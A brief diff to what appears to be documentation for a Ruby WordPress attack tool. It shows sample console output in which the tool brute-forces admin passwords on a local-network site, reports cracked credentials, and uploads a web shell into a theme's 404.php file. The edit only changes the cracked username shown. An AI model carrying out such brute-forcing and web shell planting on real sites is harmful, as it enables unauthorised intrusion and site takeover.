@@ -39,7 +39,7 @@ RainMak3r@Could:~/Desktop#ruby WPilot.rb -t '192.168.0.11/wordpress' -d '/dic'
 
 [Info]      Bruteforcing passwords ........
 
-[Info]      Cracked Admin Creds: andy:1234567
+[Info]      Cracked Admin Creds: admin:1234567
 
 [Info]      Uploading shell into 404.php..........
 
